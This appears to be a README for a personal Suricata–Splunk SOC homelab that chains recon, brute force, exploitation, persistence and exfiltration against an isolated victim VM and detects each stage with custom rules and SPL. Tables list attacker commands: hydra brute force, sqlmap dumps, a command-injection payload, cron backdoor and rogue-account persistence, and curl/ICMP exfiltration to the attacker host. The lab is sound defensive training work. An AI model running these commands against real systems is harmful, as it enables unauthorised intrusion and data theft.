# Suricata–Splunk SOC Homelab v2 (Realistic Attack Simulation)

## Overview
This is the second iteration of my Suricata–Splunk SOC homelab, rebuilt to simulate a **realistic attacker-vs-defender environment**. Instead of isolated rule testing, this version chains multiple real-world attack techniques against a live victim host, generates alerts through Suricata IDS/IPS, forwards logs via the **Splunk Universal Forwarder**, and analyzes/correlates them in **Splunk Enterprise** — mapped to MITRE ATT&CK.

This lab is for **educational and defensive security purposes only**, run entirely inside an isolated virtual network I control.

---

## Lab Objective
- Simulate a realistic multi-stage attack chain (recon → exploitation → post-exploitation → exfiltration)
- Detect and (where configured) block malicious traffic using Suricata IDS/IPS
- Forward `eve.json` and system logs to Splunk Enterprise via the Universal Forwarder
- Build detections and dashboards mapped to MITRE ATT&CK tactics/techniques
- Document each stage with SPL queries, Suricata alerts, and screenshots for the portfolio

---

## Lab Architecture

```
        Isolated Host-Only / NAT Network                         Host Machine
              (e.g. 192.168.50.0/24)                          192.168.100.1

  ┌────────────────────┐        ┌──────────────────────────┐        ┌────────────────────────┐
  │   Attacker: Kali    │        │  Victim: Ubuntu Server    │        │  Splunk Enterprise      │
  │  192.168.50.10      │──────▶│  192.168.50.20            │──────▶│  192.168.100.1:9997     │
  │  - nmap, hydra       │        │  - Suricata IDS/IPS       │        │  - Receives forwarded   │
  │  - Metasploit        │        │  - vsftpd/OpenSSH/Apache  │        │    eve.json + syslog    │
  │  - hping3, dirb       │        │  - Splunk Universal      │        │  - Web UI :8000         │
  │                      │        │    Forwarder              │        │  - Dashboards, SPL,     │
  │                      │        │                            │        │    correlation searches │
  └────────────────────┘        └──────────────────────────┘        └────────────────────────┘
```

> Splunk Enterprise runs on the **host machine** (reachable at `192.168.100.1`, web UI on `:8000`, receiving port `9997`) rather than a 3rd VM. Make sure the hypervisor network mode you chose for the victim (Host-Only/NAT Network) actually routes to `192.168.100.1` — with pure Host-Only adapters the host is usually reachable at the adapter's gateway IP, so confirm with `ping 192.168.100.1` from the victim before configuring the forwarder. If your victim's subnet is `192.168.50.0/24` and the host sits on a different range (`192.168.100.1`), the victim's virtual NIC needs a second adapter/route into that range, or you can rehome the whole lab onto the `192.168.100.0/24` network so everything is on one L2 segment.

### VM Requirements
| VM | OS | RAM | Purpose |
|---|---|---|---|
| Attacker | Kali Linux (latest) | 4GB | Runs all attacks |
| Victim | Ubuntu Server 22.04 LTS | 2–4GB | Runs Suricata + vulnerable services + Splunk UF |
| Host (not a VM) | Your OS | 4–8GB free | Splunk Enterprise, listening on `192.168.100.1:9997`, web UI on `:8000` |

Set the Kali and Ubuntu victim VMs to the **same isolated virtual network** (VirtualBox Host-Only Adapter or VMware Host-Only/NAT Network) with a route to the host at `192.168.100.1` — never bridge this lab to your home network.

---

## Phase 0 — Environment Setup

### 0.1 Network Setup
1. Create a Host-Only/Internal network in your hypervisor (e.g., `vboxnet0`, subnet `192.168.50.0/24`).
2. Attach Kali and the Ubuntu victim to it, and confirm the network mode gives both a route to the host at `192.168.100.1` (this is where Splunk Enterprise is already running).
3. Assign static IPs (via netplan on Ubuntu, or DHCP reservation) so Suricata rules and Splunk searches reference stable IPs.

### 0.2 Victim Ubuntu Server — Vulnerable Services
Install intentionally exploitable services so the attack chain has real targets:
```bash
sudo apt update
sudo apt install -y openssh-server apache2 vsftpd proftpd-basic
# Optional: an older/vulnerable app for exploitation practice
sudo apt install -y php php-mysql mysql-server
```
- Optionally deploy **DVWA** or **Metasploitable2** as a second target on the same subnet for web-app attacks (SQLi, command injection), separate from the Suricata host so IDS analysis stays clean.

### 0.3 Suricata Installation (Victim/Sensor Host)
```bash
sudo apt install -y suricata
sudo suricata-update
sudo nano /etc/suricata/suricata.yaml
```
Key config changes:
- Set `HOME_NET` to your victim IP, `EXTERNAL_NET` to `!$HOME_NET`
- Set the correct sniffing interface under `af-packet`
- Enable `eve-log` output in JSON format (enabled by default in modern builds) pointing to `/var/log/suricata/eve.json`
- For **IPS mode**, configure `nfqueue` and add iptables rules to route traffic through Suricata:
```bash
sudo iptables -I INPUT -j NFQUEUE --queue-num 0
sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
sudo suricata -c /etc/suricata/suricata.yaml --af-packet   # IDS mode
sudo suricata -c /etc/suricata/suricata.yaml -q 0          # IPS mode
```
Enable the service:
```bash
sudo systemctl enable --now suricata
```

### 0.4 Custom Suricata Rules
Create `/etc/suricata/rules/local.rules` with rules tailored to the attacks below (examples in Phase 2). Reference them in `suricata.yaml` under `default-rule-path` / `rule-files: - local.rules`.

### 0.5 Splunk Universal Forwarder (Victim)
```bash
wget -O splunkforwarder.tgz "https://download.splunk.com/products/universalforwarder/releases/latest/linux/splunkforwarder-linux-x86_64.tgz"
sudo tar -xzf splunkforwarder.tgz -C /opt
sudo /opt/splunkforwarder/bin/splunk start --accept-license
sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.100.1:9997
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/suricata/eve.json -sourcetype suricata
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log -sourcetype linux_secure
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/apache2/access.log -sourcetype access_combined
sudo /opt/splunkforwarder/bin/splunk enable boot-start
```

### 0.6 Splunk Enterprise (Host Machine, 192.168.100.1)
Since this is already running on your host rather than a VM, just make sure it's listening for forwarders and reachable from the victim:
```bash
sudo /opt/splunk/bin/splunk enable listen 9997
```
- Confirm your host firewall allows inbound TCP 9997 from the victim's subnet (e.g., `sudo ufw allow from 192.168.50.0/24 to any port 9997` on Linux, or the equivalent inbound rule on Windows/macOS host firewalls).
- Install the **TA-suricata** or **Suricata App for Splunk** (Splunkbase) for pre-built field extractions and dashboards, or build your own field extractions on `eve.json`.
- Verify data is arriving: `index=* sourcetype=suricata | head 20`
- Splunk Web UI is at `http://192.168.100.1:8000`.

---

## Phase 1 — Reconnaissance (MITRE ATT&CK: TA0043 Reconnaissance / TA0007 Discovery)

| Attack | Tool/Command (Kali) | Suricata Detection | Splunk SPL |
|---|---|---|---|
| Host discovery | `nmap -sn 192.168.50.0/24` | ET SCAN rules (ICMP sweep) | `index=* sourcetype=suricata event_type=alert alert.signature="*ICMP*"` |
| Port scan (SYN) | `nmap -sS -Pn 192.168.50.20` | ET SCAN Nmap SYN scan | `index=* sourcetype=suricata alert.signature="*Nmap*"` |
| Service/version detection | `nmap -sV -A 192.168.50.20` | Custom local.rule matching high connection rate | `... alert.signature="*Possible Scan*"` |
| Web directory brute force | `dirb http://192.168.50.20` or `gobuster dir -u http://192.168.50.20 -w common.txt` | HTTP rule on repeated 404s | `sourcetype=access_combined status=404 | stats count by clientip` |

**Custom Suricata rule example (port scan detection):**
```
alert tcp any any -> $HOME_NET any (msg:"CUSTOM Possible Nmap SYN Scan Detected"; flags:S; threshold:type both, track by_src, count 20, seconds 10; classtype:attempted-recon; sid:1000001; rev:1;)
```

---

## Phase 2 — Initial Access / Brute Force (MITRE ATT&CK: T1110 Brute Force, T1190 Exploit Public-Facing Application)

| Attack | Tool/Command | Suricata Detection | Splunk SPL |
|---|---|---|---|
| SSH brute force | `hydra -l admin -P rockyou.txt ssh://192.168.50.20` | Custom rule on repeated SSH SYN/auth failures | `sourcetype=linux_secure "Failed password" | stats count by src_ip | where count > 5` |
| FTP brute force | `hydra -l ftpuser -P rockyou.txt ftp://192.168.50.20` | ET FTP bruteforce rule | `sourcetype=suricata alert.signature="*FTP*brute*"` |
| Web login brute force | `hydra -l admin -P rockyou.txt 192.168.50.20 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` | Custom HTTP rule on repeated POST /login | `sourcetype=access_combined uri="/login" method=POST | stats count by clientip` |
| SQL Injection (DVWA) | `sqlmap -u "http://192.168.50.20/dvwa/vulnerabilities/sqli/?id=1" --batch --dump` | ET WEB_SERVER SQL Injection rules | `sourcetype=access_combined uri="*UNION*SELECT*"` |

**Custom Suricata rule example (SSH brute force):**
```
alert tcp any any -> $HOME_NET 22 (msg:"CUSTOM SSH Brute Force Attempt"; flow:to_server; threshold:type both, track by_src, count 5, seconds 60; classtype:attempted-user; sid:1000002; rev:1;)
```

---

## Phase 3 — Exploitation (MITRE ATT&CK: T1203 Exploitation for Client Execution / T1059 Command and Scripting Interpreter)

| Attack | Tool/Command | Suricata Detection | Splunk SPL |
|---|---|---|---|
| Reverse shell via vulnerable web upload | Metasploit (`msfconsole` → exploit module matching your target service) or manual `nc` reverse shell | ET SHELLCODE / custom rule for reverse shell ports | `sourcetype=suricata alert.signature="*shellcode*" OR alert.signature="*reverse shell*"` |
| Command injection (DVWA) | Manual payload via browser/Burp: `; whoami` etc. | Custom HTTP rule matching shell metacharacters in URI | `sourcetype=access_combined uri="*;*" OR uri="*%3B*"` |
| EternalBlue-style / known CVE exploit (if using Metasploitable2) | `msfconsole -> use exploit/...` | ET EXPLOIT rules | `sourcetype=suricata alert.signature="*EXPLOIT*"` |

**Custom Suricata rule example (reverse shell callback):**
```
alert tcp $HOME_NET any -> any 4444 (msg:"CUSTOM Possible Reverse Shell Callback"; flow:to_server,established; classtype:trojan-activity; sid:1000003; rev:1;)
```

---

## Phase 4 — Post-Exploitation / Persistence (MITRE ATT&CK: T1053 Scheduled Task/Cron, T1136 Create Account)

| Attack | Tool/Command (on victim, simulating attacker post-shell) | Suricata Detection | Splunk SPL |
|---|---|---|---|
| Add cron persistence | `(crontab -l; echo "* * * * * /tmp/backdoor.sh") \| crontab -` | N/A (host-based; log via auditd) | `sourcetype=linux_secure "crontab"` |
| Create new user | `useradd -m hacker && passwd hacker` | N/A (host-based) | `sourcetype=linux_secure "useradd"` |
| Enable auditd for host-based detection | `sudo apt install auditd`; add watch rules on `/etc/passwd`, `/etc/crontab` | — | `sourcetype=auditd | stats count by key` |

> This phase is mostly host-based (not network-visible to Suricata) — forward `/var/log/audit/audit.log` via the Universal Forwarder to catch it in Splunk, and note the detection gap in your writeup (a good talking point in interviews: "Suricata alone can't see this, which is why host-based logging matters").

---

## Phase 5 — Exfiltration (MITRE ATT&CK: T1048 Exfiltration Over Alternative Protocol / T1041 Exfiltration Over C2 Channel)

| Attack | Tool/Command | Suricata Detection | Splunk SPL |
|---|---|---|---|
| Data exfil over FTP | `curl -T sensitive.txt ftp://192.168.50.10 --user attacker:pass` | Custom rule on outbound FTP from victim | `sourcetype=suricata alert.signature="*FTP*" dest_ip=192.168.50.10` |
| Data exfil over DNS (simulated) | `dnscat2` or manual base64-in-subdomain queries | ET DNS tunneling rules | `sourcetype=suricata dns.query.rrname | stats count by dns.query.rrname` |
| Data exfil over ICMP | `hping3 --icmp -d 500 192.168.50.10` | Custom rule on oversized ICMP payload | `sourcetype=suricata alert.signature="*ICMP*large*"` |

---

## Phase 6 — Bash Automation
Keep your automation scripts in `bash-scripts/`, updated for this iteration:
- `run_lab_attacks.sh` — orchestrates the attack chain in order (recon → brute force → exploit → exfil) with sleep intervals so alerts are distinguishable in Splunk by timestamp
- `check_suricata_status.sh` — verifies Suricata service health and eve.json growth
- `forwarder_healthcheck.sh` — checks Splunk UF connectivity to the indexer (`splunk list forward-server`)
- `alert_summary.sh` — tails `eve.json`, filters `event_type=alert`, and prints a quick summary table

---

## Phase 7 — Splunk Dashboards & Correlation Searches
Build a single-pane dashboard with panels for:
1. Alerts over time by severity (`alert.severity`)
2. Top source IPs generating alerts
3. MITRE ATT&CK technique breakdown (map `alert.signature` categories to tactics manually via a lookup table)
4. Failed authentication attempts (SSH/FTP/web) over time
5. A correlation search: **"Recon → Brute Force → Shell in <15 min from same source IP"** — this is the centerpiece for your portfolio, showing you can chain low/medium alerts into a high-confidence incident.

Example correlation SPL skeleton:
```spl
index=* sourcetype=suricata event_type=alert
| stats earliest(_time) as first_seen latest(_time) as last_seen values(alert.signature) as signatures by src_ip
| where last_seen - first_seen < 900
| where mvcount(signatures) > 2
```

---

## Screenshots to Capture (for portfolio)
- Suricata alerts for each phase (`tail -f /var/log/suricata/fast.log` or eve.json snippets)
- Wireshark capture of at least one attack (e.g., the Nmap scan or the brute force)
- Splunk dashboard with the full attack timeline
- The correlation search result showing the multi-stage detection
- Before/after IPS mode: one attack that Suricata blocked (nfqueue drop) vs. one it only alerted on

---

## MITRE ATT&CK Mapping Summary
| Phase | Tactic | Example Technique |
|---|---|---|
| Recon | TA0043 Reconnaissance | T1595 Active Scanning |
| Brute Force | TA0001 Initial Access | T1110 Brute Force |
| Exploitation | TA0002 Execution | T1203, T1059 |
| Post-Exploitation | TA0003 Persistence | T1053, T1136 |
| Exfiltration | TA0010 Exfiltration | T1048, T1041 |

---

## Learning Outcomes
- End-to-end attack chain simulation instead of isolated rule testing
- Practical difference between Suricata IDS (alert-only) and IPS (nfqueue blocking) modes
- Log forwarding pipeline design using Splunk Universal Forwarder
- Writing custom Suricata rules tuned to specific attacker behavior
- Building SPL correlation searches that chain multiple low-fidelity alerts into a high-confidence detection
- Identifying detection gaps (host-based vs. network-based visibility) and compensating with auditd

## Disclaimer
This lab is conducted entirely within an isolated virtual lab environment that I own and control. All attacks are simulated against my own victim machine for educational and defensive security purposes only. No external systems, networks, or third parties are targeted.
